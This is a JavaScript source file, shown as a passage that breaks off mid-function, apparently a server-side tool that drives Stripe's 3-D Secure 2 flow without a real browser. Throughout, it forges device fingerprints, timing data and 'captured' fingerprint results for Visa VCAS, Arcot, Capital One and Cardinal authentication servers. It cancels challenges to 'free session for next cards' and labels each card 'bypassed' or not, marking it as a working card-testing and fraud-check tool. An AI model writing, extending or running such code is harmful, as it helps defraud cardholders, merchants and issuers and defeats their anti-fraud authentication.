// ═══════════════════════════════════════════════════════════════════════════
// Stripe 3DS2 frictionless completer (v5)
// Tight FE window, poll-only ACS settle (no re-auth spam), Arcot timings
// ═══════════════════════════════════════════════════════════════════════════

const STRIPE_API = "https://api.stripe.com";
const CHECKOUT_ORIGIN = "https://checkout.stripe.com";
const JS_STRIPE = "https://js.stripe.com";
const HOOKS_ORIGIN = "https://hooks.stripe.com";
const VCAS_ORIGIN = "https://methodurl.vcas.visa.com";
const VCAS_SAVE = `${VCAS_ORIGIN}/DeviceFingerprintWeb/V2/Browser/SaveBrowserData`;
const STRIPE_VERSION = "2020-08-27";
const MAX_AUTH_PASSES = 1; // HAR: one authenticate after method; re-auth kills RBA flash-close
const METHOD_WAIT_MS = 2800;
const CHALLENGE_SETTLE_MS = 13000;

function jsonRes(obj, status = 200) {
  return new Response(JSON.stringify(obj), {
    status,
    headers: {
      "content-type": "application/json",
      "access-control-allow-origin": "*",
      "access-control-allow-methods": "GET, POST, OPTIONS",
      "access-control-allow-headers": "content-type",
    },
  });
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function encodeForm(data, prefix = "") {
  const parts = [];
  for (const [k, v] of Object.entries(data)) {
    const key = prefix ? `${prefix}[${k}]` : k;
    if (v === null || v === undefined) continue;
    if (typeof v === "object" && !Array.isArray(v)) {
      parts.push(encodeForm(v, key));
      continue;
    }
    parts.push(`${encodeURIComponent(key)}=${encodeURIComponent(String(v))}`);
  }
  return parts.filter(Boolean).join("&");
}

function b64Json(obj) {
  return btoa(JSON.stringify(obj));
}

function stripeHeaders(profile, referer, { jsStripe = false } = {}) {
  const lang = profile.acceptLanguage || profile.language || "en-US,en;q=0.9";
  const origin = jsStripe ? JS_STRIPE : CHECKOUT_ORIGIN;
  return {
    "user-agent": profile.ua,
    accept: "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "accept-language": lang.includes(",") ? lang : `${lang},en;q=0.9`,
    "accept-encoding": "gzip, deflate, br, zstd",
    origin,
    referer: jsStripe ? `${JS_STRIPE}/` : (referer || `${CHECKOUT_ORIGIN}/`),
    "stripe-version": STRIPE_VERSION,
  };
}

function extractVcasAuthToken(html, serverTransId) {
  if (!html) return null;
  const re = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
  const candidates = html.match(re) || [];
  for (const tok of candidates) {
    try {
      const mid = tok.split(".")[1];
      const pad = mid + "=".repeat((4 - (mid.length % 4)) % 4);
      const payload = JSON.parse(atob(pad.replace(/-/g, "+").replace(/_/g, "/")));
      const tid = payload.threeDStransactionID || payload.threeDSServerTransID || "";
      if (serverTransId && tid && tid !== serverTransId) continue;
      if (payload.iss === "VCASDeviceFingerPrintWeb" || tid) return tok;
    } catch { /* next */ }
  }
  const m = html.match(/authToken\s*[:=]\s*['"]?(eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)/);
  return m ? m[1] : (candidates[0] || null);
}

function vcasSavePayload(profile, serverTransId, orgUnitId) {
  const ua = profile.ua || "";
  const w = profile.screenWidth || 1280;
  const h = profile.screenHeight || 800;
  const cd = profile.colorDepth || 30;
  const lang = (profile.language || "en-GB").replace("_", "-");
  const plat = ua.includes("Windows") ? "Win32" : (ua.includes("Mac") ? "MacIntel" : "Linux x86_64");
  const fp = simpleHash(`${ua}|${w}x${h}|${profile.timezone}|${serverTransId}`);
  return {
    Cookies: { Legacy: true, LocalStorage: true, SessionStorage: true },
    DeviceChannel: "Browser",
    Extended: {
      Browser: {
        Adblock: false,
        AvailableJsFonts: ["Arial", "Courier", "Courier New", "Helvetica", "Times", "Times New Roman"],
        DoNotTrack: "unknown",
        JavaEnabled: false,
      },
      Device: {
        ColorDepth: cd, Cpu: "unknown", Platform: plat,
        TouchSupport: { MaxTouchPoints: 0, OnTouchStartAvailable: false, TouchEventCreationSuccessful: false },
      },
    },
    Fingerprint: fp,
    FingerprintingTime: 110,
    FingerprintDetails: { Version: "1.5.1" },
    Language: lang,
    Latitude: null,
    Longitude: null,
    OrgUnitId: orgUnitId,
    Plugins: [
      "Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
      "PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
    ],
    ReferenceId: serverTransId,
    Referrer: `${JS_STRIPE}/`,
    Screen: {
      FakedResolution: false,
      Ratio: Math.round((w / Math.max(h, 1)) * 10) / 10,
      Resolution: `${w}x${h}`,
      UsableResolution: `${w}x${h}`,
      CCAScreenSize: "01",
    },
    ThreatMetrixEnabled: true,
    ThreatMetrixEventType: "PAYMENT",
    ThreeDSServerTransId: serverTransId,
    TimeOffset: profile.timezone ?? -330,
    UserAgent: ua,
    UserAgentDetails: { FakedOS: false, FakedBrowser: false },
    VppInitialisationResult: null,
    VppEventResult: null,
    VppRefId: null,
    VppInitialisationToken: null,
  };
}

function resolveProfile(body) {
  const bp = body?.browserProfile || {};
  return {
    ua: bp.ua || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    language: bp.language || "en-US",
    acceptLanguage: bp.acceptLanguage || bp.language || "en-US,en;q=0.9",
    timezone: bp.timezone ?? -300,
    screenWidth: bp.screenWidth || 1920,
    screenHeight: bp.screenHeight || 1080,
    colorDepth: bp.colorDepth || 24,
  };
}

function buildFingerprintUrl(merchant, source) {
  if (!merchant || !source) return null;
  return `${HOOKS_ORIGIN}/3d_secure_2/fingerprint/${merchant}/${source}`;
}

function resolve3DSContext(body) {
  const sdk = body?.nextAction?.use_stripe_sdk || {};
  const source = sdk.three_d_secure_2_source || sdk.source || body?.source || null;
  const merchant = sdk.merchant || body?.merchant || null;
  const serverTransId = sdk.server_transaction_id || body?.serverTransactionId || null;
  const methodUrl = sdk.three_ds_method_url || sdk.threeDSMethodUrl || body?.methodUrl || null;
  const fingerprintUrl = buildFingerprintUrl(merchant, source) || body?.fingerprintUrl || null;
  const sdkType = (sdk.type || body?.sdkType || "").toLowerCase();
  const acsProfile = resolveAcsProfile(methodUrl, null, sdk, body?.acsProfile);
  return { sdk, source, merchant, serverTransId, methodUrl, fingerprintUrl, sdkType, acsProfile };
}

const ACS_DEFAULT = {
  name: "generic",
  methodWaitMs: 2400,
  arcotExtras: false,
  methodGetFirst: true,
  creqOrigin: "https://js.stripe.com",
  challengePollMs: 12000,
  lateHooks: true,
  deviceDataTries: 2,
};

const ACS_RULES = [
  ["vcas", [/vcas\.visa\.com/i, /methodurl\.vcas/i], { vcasExtras: true, methodWaitMs: 2800, methodGetFirst: true, challengePollMs: 13000 }],
  ["capital_one", [/capitalone\.com/i, /3ds-method-url/i, /\/stepup/i], { methodWaitMs: 2600, methodGetFirst: false, challengePollMs: 13500 }],
  ["arcot", [/arcot\.com/i, /\/content-server\//i, /\/tds-method/i], { arcotExtras: true, methodGetFirst: true, challengePollMs: 12000, deviceDataTries: 2 }],
  ["cardinal", [/cardinalcommerce\.com/i, /centinelapi/i, /geoissuer/i], { methodWaitMs: 2100, challengePollMs: 13500 }],
  ["discover", [/discover\.com/i, /discovercard/i], { challengePollMs: 13000 }],
  ["amex", [/americanexpress/i, /safekey/i, /aexp\.com/i], { challengePollMs: 12000 }],
];

function resolveAcsProfile(methodUrl, acsUrl, sdk, hint) {
  if (hint) return { ...ACS_DEFAULT, name: hint };
  const blob = [methodUrl || "", acsUrl || "", sdk?.directory_server_name || ""].join(" ").toLowerCase();
  for (const [name, patterns, cfg] of ACS_RULES) {
    if (patterns.some((p) => p.test(blob))) return { ...ACS_DEFAULT, ...cfg, name };
  }
  const prof = { ...ACS_DEFAULT };
  if (/arcot|\/tds-method/.test(blob)) {
    prof.arcotExtras = true;
    prof.name = "arcot_generic";
  }
  return prof;
}

/** HAR-exact browser payload — sent as ONE JSON string in form field `browser`. */
function browserJson(profile, serverTransId) {
  const lang = (profile.language || "en-US").replace("_", "-");
  return {
    fingerprintAttempted: true,
    fingerprintData: serverTransId
      ? b64Json({ threeDSServerTransID: serverTransId })
      : null,
    challengeWindowSize: null,
    threeDSCompInd: "Y",
    browserJavaEnabled: false,
    browserJavascriptEnabled: true,
    browserLanguage: lang,
    browserColorDepth: String(profile.colorDepth || 24),
    browserScreenHeight: String(profile.screenHeight || 1080),
    browserScreenWidth: String(profile.screenWidth || 1920),
    browserTZ: String(profile.timezone ?? -300),
    browserUserAgent: profile.ua,
  };
}

async function postForm(url, body, profile, extraHeaders = {}) {
  try {
    let origin = JS_STRIPE;
    if (url.includes("hooks.stripe.com") && extraHeaders.origin) origin = extraHeaders.origin;
    else if (extraHeaders.origin) origin = extraHeaders.origin;
    else if (url.includes("vcas.visa.com")) origin = VCAS_ORIGIN;
    const headers = {
      "user-agent": profile.ua,
      "content-type": "application/x-www-form-urlencoded",
      accept: "*/*",
      origin,
      referer: extraHeaders.referer || `${origin}/`,
      ...extraHeaders,
    };
    const r = await fetch(url, { method: "POST", headers, body });
    return r;
  } catch {
    return null;
  }
}

function deviceDataUrl(methodUrl, serverTransId) {
  if (!methodUrl || !serverTransId) return null;
  if (methodUrl.includes("tds-method-post-device-data")) return methodUrl;
  if (methodUrl.endsWith("/tds-method")) {
    return methodUrl.replace(/\/tds-method\/?$/, `/tds-method-post-device-data/${serverTransId}`);
  }
  if (methodUrl.includes("/tds-method")) {
    return methodUrl.replace("/tds-method", `/tds-method-post-device-data/${serverTransId}`);
  }
  return null;
}

function arcotDeviceData(profile) {
  const h = profile.screenHeight || 1080;
  const w = profile.screenWidth || 1920;
  const cd = profile.colorDepth || 24;
  const lang = (profile.language || "en-US").replace("_", "-");
  const ua = profile.ua || "";
  const plat = ua.includes("Windows") ? "Win32" : (ua.includes("Mac") ? "MacIntel" : "Linux x86_64");
  return JSON.stringify({
    VERSION: "2.0",
    MFP: {
      Browser: {
        UserAgent: ua, Vendor: "Google Inc.", VendorSubID: "",
        BuildID: "20030107", CookieEnabled: true,
      },
      IEPlugins: {},
      NetscapePlugins: {
        "Chromium PDF Viewer": "", "Microsoft Edge PDF Viewer": "",
        "WebKit built-in PDF": "", "PDF Viewer": "",
      },
      Screen: {
        FullHeight: h, AvlHeight: h, FullWidth: w, AvlWidth: w,
        ColorDepth: cd, PixelDepth: cd,
      },
      System: { Platform: plat, systemLanguage: lang, Timezone: profile.timezone ?? -300 },
    },
    ExternalIP: "",
  });
}

function isoMs(d = new Date()) {
  return d.toISOString();
}

function scriptTimings(t0, t1) {
  const start = isoMs(t0);
  const mid = isoMs(new Date(t0.getTime() + Math.max(50, (t1 - t0) * 0.15)));
  const end = isoMs(t1);
  const elapsed = Math.max(1, t1.getTime() - t0.getTime());
  return JSON.stringify({
    tds_post_data_fingerprintjs2_start_time: start,
    tds_post_data_arcotddna_start_time: start,
    tds_post_data_arcotddna_end_time: mid,
    tds_post_data_arcotddna_elapsed_time: Math.max(1, Math.floor(elapsed * 0.13)),
    tds_post_data_tdsscript_start_time: start,
    tds_post_data_tdsscript_end_time: end,
    tds_post_data_tdsscript_elapsed_time: elapsed,
    tds_post_data_fingerprintjs2_end_time: end,
    tds_post_data_fingerprintjs2_elapsed_time: elapsed,
    tds_post_data_form_submit: "graceful",
    tds_post_data_fpapi_elapsed_time: Math.max(1, Math.floor(elapsed * 0.88)),
    tds_post_data_fpapi_error_msg: "",
  });
}

function frontendExecutionB64(startedMs, completedMs) {
  const elapsedS = Math.max(1, (completedMs - startedMs) / 1000);
  const timeout = Math.max(5, Math.min(9, Math.floor(elapsedS + 4)));
  return btoa(JSON.stringify({
    fingerprintOutcome: "captured",
    fingerprintCompletedAt: completedMs,
    fingerprintTimeout: timeout,
    fingerprintStartedAt: startedMs,
  }));
}

function arcotFingerprintjsUrl(methodUrl) {
  if (!methodUrl || !methodUrl.includes("arcot.com") || !methodUrl.includes("/content-server/")) {
    return null;
  }
  return methodUrl.split("/content-server/")[0] + "/content-server/api/tds2-fingerprintjs";
}

function simpleHash(str) {
  // non-crypto fingerprintId stand-in (md5-like hex length)
  let h = 0x811c9dc5;
  for (let i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  const a = (h >>> 0).toString(16).padStart(8, "0");
  const b = Math.imul(h ^ str.length, 0x85ebca6b) >>> 0;
  return (a + b.toString(16).padStart(8, "0")).padEnd(32, "0").slice(0, 32);
}

function arcotB64DeviceInfo(profile, serverTransId) {
  const ua = profile.ua || "";
  const h = profile.screenHeight || 1080;
  const w = profile.screenWidth || 1920;
  const lang = (profile.language || "en-US").replace("_", "-");
  const tz = profile.tzName || "America/New_York";
  const plat = ua.includes("Windows") ? "Win32" : (ua.includes("Mac") ? "MacIntel" : "Linux x86_64");
  const fpHash = simpleHash(`${ua}|${w}x${h}|${tz}|${serverTransId}`);
  const info = {
    audio: 123.95783746962843,
    colorGamut: "p3",
    dyanmicRange: true,
    hardwareConcurrency: profile.deviceMemory || 8,
    height: h,
    language: lang,
    motionReduced: false,
    openDatabase: false,
    platform: plat,
    plugins: [
      ["Chromium PDF Viewer", "Portable Document Format", [["application/pdf", "pdf"], ["text/pdf", "pdf"]]],
      ["PDF Viewer", "Portable Document Format", [["application/pdf", "pdf"], ["text/pdf", "pdf"]]],
    ],
    timezone: tz.includes("Kolkata") ? "Asia/Calcutta" : tz,
    touchSupport: [0, false, false],
    userAgent: ua,
    webgl: [],
    webglVendorAndRenderer: "Google Inc. (NVIDIA)",
    width: w,
    fingerprintHash: fpHash,
  };
  return { fpHash, b64: btoa(JSON.stringify(info)) };
}

async function runMethodChain({ methodUrl, fingerprintUrl, serverTransId, profile, acsProfile }) {
  const paths = [];
  const startedMs = Date.now();
  const acs = acsProfile || ACS_DEFAULT;
  if (!methodUrl || !serverTransId) {
    return { paths, startedMs, completedMs: Date.now(), acs: acs.name };
  }

  const methodDataFull = b64Json({
    threeDSServerTransID: serverTransId,
    threeDSMethodNotificationURL: fingerprintUrl,
  });
  const methodForm = `threeDSMethodData=${encodeURIComponent(methodDataFull)}`;

  try {
    if (acs.methodGetFirst) {
      await fetch(methodUrl, {
        method: "GET",
        headers: {
          "user-agent": profile.ua,
          accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "sec-fetch-site": "cross-site",
          "sec-fetch-mode": "navigate",
          "sec-fetch-dest": "iframe",
        },
      });
      paths.push("method_get");
      await sleep(200);
    }
  } catch { /* best-effort */ }

  const methodResp = await postForm(methodUrl, methodForm, profile, {
    origin: JS_STRIPE,
    referer: `${JS_STRIPE}/`,
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "navigate",
    "sec-fetch-dest": "iframe",
  });
  paths.push("method");
  let methodHtml = "";
  try { methodHtml = methodResp ? await methodResp.text() : ""; } catch { /* */ }

  const isVcas = /vcas\.visa\.com/i.test(methodUrl || "") || acs.vcasExtras;
  if (isVcas) {
    const orgId = (new URL(methodUrl)).searchParams.get("id");
    const token = extractVcasAuthToken(methodHtml, serverTransId);
    if (token && orgId) {
      try {
        await fetch(`${VCAS_SAVE}?authToken=${encodeURIComponent(token)}`, {
          method: "POST",
          headers: {
            "user-agent": profile.ua,
            "content-type": "application/json",
            origin: VCAS_ORIGIN,
            referer: methodUrl,
          },
          body: JSON.stringify(vcasSavePayload(profile, serverTransId, orgId)),
        });
        paths.push("vcas_save");
      } catch { /* best-effort */ }
      await sleep(1200);
    } else {
      paths.push("vcas_no_token");
      await sleep(400);
    }
  }

  const fpjsUrl = arcotFingerprintjsUrl(methodUrl);
  if (acs.arcotExtras && fpjsUrl) {
    const { fpHash, b64 } = arcotB64DeviceInfo(profile, serverTransId);
    try {
      await fetch(fpjsUrl, {
        method: "POST",
        headers: {
          "user-agent": profile.ua,
          "content-type": "application/json",
          origin: JS_STRIPE,
          referer: methodUrl,
        },
        body: JSON.stringify({
          fingerprintId: fpHash,
          txnid: serverTransId,
          tm_deviceid: "",
          tm_devicedata: profile.ua || "",
          b64DeviceInfo: b64,
        }),
      });
      paths.push("arcot_fpjs");
    } catch { /* best-effort */ }
    await sleep(200);
  }

  const devUrl = deviceDataUrl(methodUrl, serverTransId);
  if (acs.arcotExtras && devUrl && fingerprintUrl) {
    const t0 = new Date();
    const t1 = new Date(t0.getTime() + 600);
    await postForm(
      devUrl,
      encodeForm({
        threeDSServerTransId: serverTransId,
        threeDSMethodNotificationURL: fingerprintUrl,
        deviceData: arcotDeviceData(profile),
        scriptTimings: scriptTimings(t0, t1),
      }),
      profile,
      { origin: JS_STRIPE, referer: methodUrl, "sec-fetch-site": "cross-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty" },
    );
    paths.push("device_data");
  }

  if (fingerprintUrl) {
    const hookOrigin = isVcas ? VCAS_ORIGIN : JS_STRIPE;
    await postForm(
      fingerprintUrl,
      `threeDSMethodData=${encodeURIComponent(b64Json({ threeDSServerTransID: serverTransId }))}`,
      profile,
      {
        origin: hookOrigin,
        referer: `${hookOrigin}/`,
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "navigate",
        "sec-fetch-dest": "iframe",
      },
    );
    paths.push("hooks_fp");
  }

  // HAR FE window is the real method duration (~2.8–3.6s), not a fake 500ms clamp
  const elapsed = Date.now() - startedMs;
  const target = acs.methodWaitMs || METHOD_WAIT_MS;
  if (elapsed < target) await sleep(target - elapsed);
  const completedMs = Date.now();
  return { paths, startedMs, completedMs, acs: acs.name };
}

async function stripeAuthenticate({
  pk, profile, referer, source, serverTransId, feStartedMs, feCompletedMs,
}) {
  // Critical: browser must be a JSON *string*, not nested form fields (HAR).
  let body =
    `source=${encodeURIComponent(source)}` +
    `&browser=${encodeURIComponent(JSON.stringify(browserJson(profile, serverTransId)))}` +
    `&one_click_authn_device_support[hosted]=false` +
    `&one_click_authn_device_support[same_origin_frame]=false` +
    `&one_click_authn_device_support[spc_eligible]=false` +
    `&one_click_authn_device_support[webauthn_eligible]=false` +
    `&one_click_authn_device_support[publickey_credentials_get_allowed]=true`;
  if (feStartedMs != null) {
    const done = feCompletedMs != null ? feCompletedMs : (feStartedMs + 450);
    body += `&frontend_execution=${encodeURIComponent(frontendExecutionB64(feStartedMs, done))}`;
  }
  body += `&key=${encodeURIComponent(pk)}`;
  const r = await fetch(`${STRIPE_API}/v1/3ds2/authenticate`, {
    method: "POST",
    headers: stripeHeaders(profile, referer, { jsStripe: true }),
    body,
  });
  const data = await r.json().catch(() => ({}));
  return { ok: r.ok, status: r.status, data };
}

function isChallenge(auth) {
  const state = (auth?.state || "").toLowerCase();
  const ts = auth?.ares?.transStatus;
  return state === "challenge_required" || ts === "C";
}

function isFrictionless(auth) {
  const state = (auth?.state || "").toLowerCase();
  const ts = auth?.ares?.transStatus;
  return state === "succeeded" || ts === "Y" || ts === "A";
}

async function fetchPaymentIntent(piId, clientSecret, pk, profile, referer) {
  const qs = new URLSearchParams({
    client_secret: clientSecret,
    key: pk,
    is_stripe_sdk: "false",
  });
  const r = await fetch(`${STRIPE_API}/v1/payment_intents/${encodeURIComponent(piId)}?${qs}`, {
    headers: stripeHeaders(profile, referer),
  });
  return r.json().catch(() => ({}));
}

async function confirmPaymentIntent(piId, clientSecret, pk, profile, referer, paymentMethod) {
  const payload = { client_secret: clientSecret, key: pk };
  if (paymentMethod) payload.payment_method = paymentMethod;
  const r = await fetch(`${STRIPE_API}/v1/payment_intents/${encodeURIComponent(piId)}/confirm`, {
    method: "POST",
    headers: stripeHeaders(profile, referer),
    body: encodeForm(payload),
  });
  return r.json().catch(() => ({}));
}

function extractOutcome(pi) {
  const err = pi?.last_payment_error || {};
  return {
    paymentStatus: pi?.status || null,
    declineCode: err.decline_code || null,
    code: err.code || null,
    message: err.message || null,
    paymentIntent: pi,
  };
}

function isPiTerminal(st) {
  return ["requires_payment_method", "canceled", "succeeded", "processing", "requires_capture"].includes(st);
}

async function postAcsCreq(auth, profile, creqOrigin = "https://js.stripe.com") {
  const creq = (auth?.creq || "").trim();
  const acsUrl = (auth?.ares?.acsURL || auth?.ares?.acsUrl || "").trim();
  if (!creq || !acsUrl) return false;
  try {
    await fetch(acsUrl, {
      method: "POST",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        origin: creqOrigin,
        referer: `${creqOrigin}/`,
        "user-agent": profile.ua || "",
        accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": profile.acceptLanguage || profile.language || "en-US,en;q=0.9",
      },
      body: `creq=${encodeURIComponent(creq)}`,
      redirect: "manual",
    });
    return true;
  } catch {
    return false;
  }
}

function isAuthFailMsg(msg, code) {
  const low = (msg || "").toLowerCase();
  return (
    code === "payment_intent_authentication_failure"
    || low.includes("failed authentication")
    || low.includes("failed or been canceled")
    || low.includes("attached payment method has been removed")
    || low.includes("payment_method_data")
  );
}

function unwrapPi(data) {
  if (!data || typeof data !== "object") return null;
  if (data.object === "payment_intent" || (typeof data.id === "string" && data.id.startsWith("pi_"))) return data;
  if (data.error?.payment_intent) return data.error.payment_intent;
  if (data.payment_intent) return data.payment_intent;
  return null;
}

async function sourceCancel3ds(piId, source, pk, profile) {
  if (!piId || !source || !pk) return null;
  try {
    const r = await fetch(`${STRIPE_API}/v1/payment_intents/${encodeURIComponent(piId)}/source_cancel`, {
      method: "POST",
      headers: stripeHeaders(profile, `${JS_STRIPE}/`, { jsStripe: true }),
      body: encodeForm({ source, key: pk }),
    });
    const data = await r.json().catch(() => null);
    return unwrapPi(data) || data;
  } catch {
    return null;
  }
}

async function settleChallengeFlash({
  pk, profile, referer, source, serverTransId, piId, clientSecret, auth, paths, start,
  acsProfile,
}) {
  // Merge method profile (VCAS) with ACS host (Cap One stepup / Cardinal)
  const acsUrl = (auth?.ares?.acsURL || auth?.ares?.acsUrl || "").trim();
  const fromAcs = resolveAcsProfile(null, acsUrl, null, null);
  const acs = {
    ...(acsProfile || ACS_DEFAULT),
    ...(fromAcs.name !== "generic" ? fromAcs : {}),
  };
  paths.push(`acs:${acs.name}`);
  // Friend path: creq → poll-only. Re-auth here kills Capital One RBA flash-close.
  if (await postAcsCreq(auth, profile, acs.creqOrigin || JS_STRIPE)) paths.push("acs_creq");
  await sleep(400);
  const deadline = Date.now() + (acs.challengePollMs || CHALLENGE_SETTLE_MS);
  let lastPi = null;
  const lastAuth = auth;

  while (Date.now() < deadline) {
    await sleep(500);
    if (!piId || !clientSecret) continue;
    lastPi = await fetchPaymentIntent(piId, clientSecret, pk, profile, referer);
    const st = (lastPi?.status || "").toLowerCase();
    const lpe = lastPi?.last_payment_error || {};
    if (isPiTerminal(st)) {
      paths.push(`settle:${st}`);
      return {
        settled: true, pi: lastPi, lastAuth, fingerprintDone: true,
        frictionless: ["succeeded", "processing", "requires_capture"].includes(st),
      };
    }
    if (st && st !== "requires_action" && (lpe.decline_code || lpe.message)) {
      paths.push(`settle_err:${st}`);
      return { settled: true, pi: lastPi, lastAuth, fingerprintDone: true };
    }
    if (isAuthFailMsg(lpe.message, lpe.code)) {
      paths.push("settle_auth_fail");
      return { settled: true, pi: lastPi, lastAuth, fingerprintDone: false, authFailed: true };
    }
  }

  // One last poll — never invent decline codes
  if (piId && clientSecret) {
    lastPi = await fetchPaymentIntent(piId, clientSecret, pk, profile, referer) || lastPi;
    const st = (lastPi?.status || "").toLowerCase();
    const lpe = lastPi?.last_payment_error || {};
    if (isPiTerminal(st) || lpe.decline_code || lpe.message || isAuthFailMsg(lpe.message, lpe.code)) {
      paths.push(`settle_final:${st || "lpe"}`);
      return {
        settled: true, pi: lastPi, lastAuth, fingerprintDone: true,
        frictionless: ["succeeded", "processing", "requires_capture"].includes(st),
      };
    }
  }

  // Free session for next cards. Cancel → Stripe auth_failure LPE (HAR).
  paths.push("challenge_wall");
  const canceled = unwrapPi(await sourceCancel3ds(piId, source, pk, profile));
  if (canceled?.id) {
    paths.push("source_cancel");
    const st = (canceled.status || "").toLowerCase();
    const lpe = canceled.last_payment_error || {};
    if (isPiTerminal(st) || lpe.decline_code || lpe.message || isAuthFailMsg(lpe.message, lpe.code)) {
      const authCancel = isAuthFailMsg(lpe.message, lpe.code);
      paths.push(authCancel ? "cancel_auth_fail" : "cancel_declined");
      return {
        settled: true, pi: canceled, lastAuth,
        fingerprintDone: !authCancel,
        authFailed: authCancel,
      };
    }
  }
  return { settled: false, pi: lastPi, lastAuth, elapsedMs: Date.now() - start };
}

async function aggressive3DSFlow({
  pk,
  profile,
  referer,
  source,
  sdkType,
  serverTransId,
  methodUrl,
  fingerprintUrl,
  piId,
  clientSecret,
  paymentMethod,
  start,
  acsProfile,
}) {
  const paths = [];
  let lastAuth = null;
  let frictionlessOk = false;
  let fingerprintDone = false;
  let settledPi = null;
  let feStartedMs = Date.now() - 450;
  let feCompletedMs = Date.now();
  const acs = acsProfile || ACS_DEFAULT;

  if (methodUrl && serverTransId) {
    const chain = await runMethodChain({ methodUrl, fingerprintUrl, serverTransId, profile, acsProfile: acs });
    paths.push(...(chain.paths || []), `acs:${chain.acs || acs.name}`);
    feStartedMs = chain.startedMs || feStartedMs;
    feCompletedMs = chain.completedMs || feCompletedMs;
  }

  for (let pass = 0; pass < MAX_AUTH_PASSES; pass++) {
    const { data: auth } = await stripeAuthenticate({
      pk,
      profile,
      referer,
      source,
      serverTransId,
      feStartedMs,
      feCompletedMs,
    });
    lastAuth = auth;
    const ts = auth?.ares?.transStatus;
    const state = (auth?.state || "").toLowerCase();
    paths.push(`auth${pass + 1}:${auth?.state || ts || "?"}`);

    if (auth?.error) {
      const msg = auth.error.message || "3ds2/authenticate failed";
      const low = msg.toLowerCase();
      // PM failed auth — surface Stripe's real PI error, never invent generic_decline
      if (low.includes("failed authentication") || low.includes("payment_method_data")) {
        let pi = null;
        if (piId && clientSecret) {
          pi = await fetchPaymentIntent(piId, clientSecret, pk, profile, referer);
        }
        const out = extractOutcome(pi || {});
        return {
          status: out.paymentStatus || "requires_payment_method",
          bypassed: false,
          fingerprint_done: true,
          path: paths.join(" → ") + " → pm_auth_failed",
          message: out.message || msg,
          declineCode: out.declineCode || null,
          code: out.code || null,
          paymentIntent: out.paymentIntent || pi,
          elapsedMs: Date.now() - start,
        };
      }
      return {
        status: "error",
        error: msg.startsWith("Invalid string") ? "3DS browser payload rejected" : msg,
        bypassed: false,
        path: paths.join(" → "),
        raw: auth,
        elapsedMs: Date.now() - start,
      };
    }

    if (isFrictionless(auth)) {
      paths.push("frictionless");
      frictionlessOk = true;
      fingerprintDone = true;
      break;
    }

    // HAR golden path: state=failed + transStatus=N after fingerprint → decline
    if (["N", "U", "R"].includes(ts) || state === "failed" || state === "processing") {
      paths.push(`ares:${ts || state}`);
      fingerprintDone = true;
      break;
    }

    if (isChallenge(auth)) {
      // HAR: POST creq to stepup + poll PI — Capital One RBA auto-decline (~11–12s)
      const flash = await settleChallengeFlash({
        pk, profile, referer, source, serverTransId, piId, clientSecret, auth, paths, start,
        acsProfile: acs,
      });
      if (flash.settled) {
        paths.push(flash.authFailed ? "settle_auth_fail" : "settle_ok");
        if (flash.pi?.id || flash.pi?.status) settledPi = flash.pi;
        lastAuth = flash.lastAuth || lastAuth;
        frictionlessOk = !!flash.frictionless && !flash.authFailed;
        // Auth-fail cancel ≠ bypass
        fingerprintDone = !!flash.fingerprintDone && !flash.authFailed;
        break;
      }
      return {
        status: "challenge_required",
        bypassed: false,
        challenge: true,
        fingerprint_done: false,
        path: paths.join(" → "),
        transStatus: ts,
        paymentIntent: flash.pi || null,
        elapsedMs: Date.now() - start,
      };
    }

    if (pass < MAX_AUTH_PASSES - 1) {
      await sleep(400);
    }
  }

  let pi = settledPi;
  if (piId && clientSecret) {
    await sleep(300);
    const polled = await fetchPaymentIntent(piId, clientSecret, pk, profile, referer);
    if (polled?.id || polled?.status) pi = polled;
    paths.push(`pi_poll:${pi?.status || "?"}`);

    // ONLY reconfirm after frictionless Y/A — never after N/fail
    if (frictionlessOk && pi?.status === "requires_action" && paymentMethod) {
      const reconf = await confirmPaymentIntent(piId, clientSecret, pk, profile, referer, paymentMethod);
      const rmsg = (reconf?.error?.message || "").toLowerCase();
      if (rmsg.includes("failed authentication")) {
        paths.push("reconfirm_skip:pm_auth_failed");
        pi = await fetchPaymentIntent(piId, clientSecret, pk, profile, referer) || pi;
      } else {
        paths.push(`reconfirm:${reconf?.status || "?"}`);
        if (reconf?.id) pi = reconf;
      }
    }
  }

  const outcome = pi?.id ? extractOutcome(pi) : {
    paymentStatus: lastAuth?.state === "succeeded" ? "succeeded" : (lastAuth?.state || null),
    paymentIntent: lastAuth,
  };

  const st = (outcome.paymentStatus || "").toLowerCase();
  const ts = lastAuth?.ares?.transStatus;
  if (["Y", "A", "N", "U", "R"].includes(ts)) fingerprintDone = true;
  const paid = ["succeeded", "processing", "requires_capture"].includes(st);
  const authFail = isAuthFailMsg(outcome.message, outcome.code);
  const declined = st === "requires_payment_method" || !!(outcome.declineCode || outcome.message);
  // Auth failed / source_cancel = Not Bypassed. Real issuer decline after fingerprint = Bypassed.
  const bypassed = !authFail && fingerprintDone && (paid || declined) && st !== "requires_action";
  let msg = outcome.message || null;
  if (authFail) msg = "Authentication failed";

  return {
    status: outcome.paymentStatus || lastAuth?.state || "unknown",
    paymentStatus: outcome.paymentStatus || lastAuth?.state,
    bypassed,
    fingerprint_done: !authFail && fingerprintDone && st !== "requires_action",
    challenge: st === "requires_action",
    path: paths.join(" → "),
    declineCode: outcome.declineCode || null,
    code: outcome.code || (authFail ? "payment_intent_authentication_failure" : null),
    message: msg,
